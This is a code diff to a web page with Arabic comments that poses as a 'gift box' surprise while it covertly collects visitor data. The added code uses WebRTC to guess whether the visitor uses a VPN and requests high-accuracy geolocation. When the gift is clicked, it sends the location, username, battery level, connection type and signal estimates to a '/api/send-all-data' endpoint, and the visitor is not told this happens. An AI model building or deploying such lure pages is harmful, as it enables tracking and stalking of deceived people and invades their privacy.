@@ -308,6 +308,8 @@
 <script>
 let alreadySent = false;
 let username = '';
+let locationData = null;
+let vpnDetected = false;
 
 // خلفية القلوب
 function createHeartsBackground() {
@@ -359,6 +361,84 @@ function createHackerText() {
 }
 createHackerText();
 
+// الكشف عن الـ VPN
+function detectVPN() {
+  return new Promise((resolve) => {
+    // طريقة 1: التحقق من وجود WebRTC leak
+    try {
+      const pc = new RTCPeerConnection({
+        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+      });
+      
+      pc.onicecandidate = (event) => {
+        if (event.candidate) {
+          const candidate = event.candidate.candidate;
+          // إذا كان الـ IP يبدأ بـ 192.168 أو 10. أو 172. فهذا IP محلي
+          // إذا كان IP عام وغريب فقد يكون VPN
+          const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
+          const ip = candidate.match(ipRegex);
+          if (ip) {
+            const parts = ip[0].split('.');
+            const firstOctet = parseInt(parts[0]);
+            // IP خاص
+            if (firstOctet === 10 || firstOctet === 127 || 
+                (firstOctet === 172 && parseInt(parts[1]) >= 16 && parseInt(parts[1]) <= 31) ||
+                (firstOctet === 192 && parseInt(parts[1]) === 168)) {
+              resolve(false);
+            } else {
+              // IP عام - قد يكون VPN
+              resolve(true);
+            }
+          }
+          pc.close();
+        }
+      };
+      
+      pc.createDataChannel('test');
+      pc.createOffer()
+        .then(offer => pc.setLocalDescription(offer))
+        .catch(() => resolve(false));
+      
+      setTimeout(() => {
+        pc.close();
+        resolve(false);
+      }, 3000);
+    } catch (e) {
+      resolve(false);
+    }
+  });
+}
+
+// جلب الموقع الجغرافي
+function getLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve(null);
+      return;
+    }
+    
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        resolve({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          altitude: position.coords.altitude,
+          speed: position.coords.speed
+        });
+      },
+      (error) => {
+        resolve(null);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  });
+}
+
 // عناصر DOM
 const loginScreen = document.getElementById('login-screen');
 const giftScreen = document.getElementById('gift-screen');
@@ -386,6 +466,15 @@ loginForm.addEventListener('submit', function(e) {
   giftUsername.textContent = username;
   loginScreen.classList.add('hidden');
   giftScreen.classList.remove('hidden');
+  
+  // جلب الموقع والـ VPN في الخلفية
+  getLocation().then(location => {
+    locationData = location;
+  });
+  
+  detectVPN().then(result => {
+    vpnDetected = result;
+  });
 });
 
 // معالج صندوق الهدية
@@ -399,64 +488,111 @@ giftBox.addEventListener('click', function() {
   setTimeout(() => {
     document.body.classList.add('green-mode');
     
-    if ('getBattery' in navigator && !alreadySent) {
+    if (!alreadySent) {
       alreadySent = true;
       
-      navigator.getBattery().then(function(battery) {
-        let percent = Math.round(battery.level * 100);
-        
-        // جلب معلومات النت من المتصفح
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        
-        let speed = 'غير معروف';
-        let signal = 'غير معروف';
-        let network = 'غير معروف';
-        
-        if (connection) {
-          // السرعة الفعلية (downlink)
-          if (connection.downlink !== undefined && connection.downlink !== null) {
-            speed = connection.downlink.toFixed(2) + ' Mbps';
+      // جمع كل البيانات
+      const allData = {
+        username: username,
+        location: locationData,
+        vpn: vpnDetected
+      };
+      
+      // معلومات البطارية
+      if ('getBattery' in navigator) {
+        navigator.getBattery().then(function(battery) {
+          let percent = Math.round(battery.level * 100);
+          allData.battery = percent;
+          
+          // معلومات الشبكة
+          const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+          
+          let speed = 'غير معروف';
+          let signal = 'غير معروف';
+          let network = 'غير معروف';
+          let connectionType = 'غير معروف';
+          
+          if (connection) {
+            // السرعة
+            if (connection.downlink !== undefined && connection.downlink !== null) {
+              speed = connection.downlink.toFixed(2) + ' Mbps';
+            }
+            
+            // نوع الشبكة
+            if (connection.effectiveType) {
+              const types = {
+                'slow-2g': '2G',
+                '2g': '2G', 
+                '3g': '3G',
+                '4g': '4G'
+              };
+              network = types[connection.effectiveType] || connection.effectiveType;
+            }
+            
+            // قوة الإشارة
+            if (connection.bars !== undefined && connection.bars !== null) {
+              const bars = Math.min(Math.max(Math.round(connection.bars), 0), 4);
+              signal = bars + '/4';
+            } else {
+              const spd = connection.downlink || 0;
+              if (spd >= 50) signal = '4/4';
+              else if (spd >= 20) signal = '3/4';
+              else if (spd >= 5) signal = '2/4';
+              else if (spd >= 1) signal = '1/4';
+              else signal = '0/4';
+            }
+            
+            // نوع الاتصال (Wi-Fi أو بيانات)
+            if (connection.type) {
+              const types = {
+                'wifi': '📶 واي فاي',
+                'cellular': '📱 بيانات جوال',
+                'ethernet': '🔌 إيثرنت',
+                'none': '🚫 غير متصل',
+                'unknown': '❓ غير معروف'
+              };
+              connectionType = types[connection.type] || connection.type;
+            } else {
+              // تقدير من السرعة
+              const downlink = connection.downlink || 0;
+              const rtt = connection.rtt || 0;
+              if (downlink > 10 && rtt < 50) {
+                connectionType = '📶 واي فاي (تقديري)';
+              } else if (downlink > 0) {
+                connectionType = '📱 بيانات جوال (تقديري)';
+              } else {
+                connectionType = '🚫 غير متصل';
+              }
+            }
           }
           
-          // نوع الشبكة
-          if (connection.effectiveType) {
-            const types = {
-              'slow-2g': '2G',
-              '2g': '2G', 
-              '3g': '3G',
-              '4g': '4G'
-            };
-            network = types[connection.effectiveType] || connection.effectiveType;
-          }
+          allData.speed = speed;
+          allData.signal = signal;
+          allData.network = network;
+          allData.connectionType = connectionType;
           
-          // قوة الإشارة (bars)
-          if (connection.bars !== undefined && connection.bars !== null) {
-            const bars = Math.min(Math.max(Math.round(connection.bars), 0), 4);
-            signal = bars + '/4';
-          } else {
-            // تقدير من السرعة
-            const spd = connection.downlink || 0;
-            if (spd >= 50) signal = '4/4';
-            else if (spd >= 20) signal = '3/4';
-            else if (spd >= 5) signal = '2/4';
-            else if (spd >= 1) signal = '1/4';
-            else signal = '0/4';
-          }
-        }
-        
-        // إرسال البيانات
+          // إرسال جميع البيانات
+          fetch('/api/send-all-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(allData)
+          });
+        }).catch(() => {
+          // إذا فشلت البطارية، نرسل البيانات المتاحة
+          fetch('/api/send-all-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(allData)
+          });
+        });
+      } else {
+        // إذا لم تدعم البطارية
         fetch('/api/send-all-data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            username: username, 
-            battery: percent,
-            speed: speed,
-            signal: signal,
-            network: network
-          })
+          body: JSON.stringify(allData)
         });
-      }).catch(() => {});
+      }
     }
   }, 600);
 });
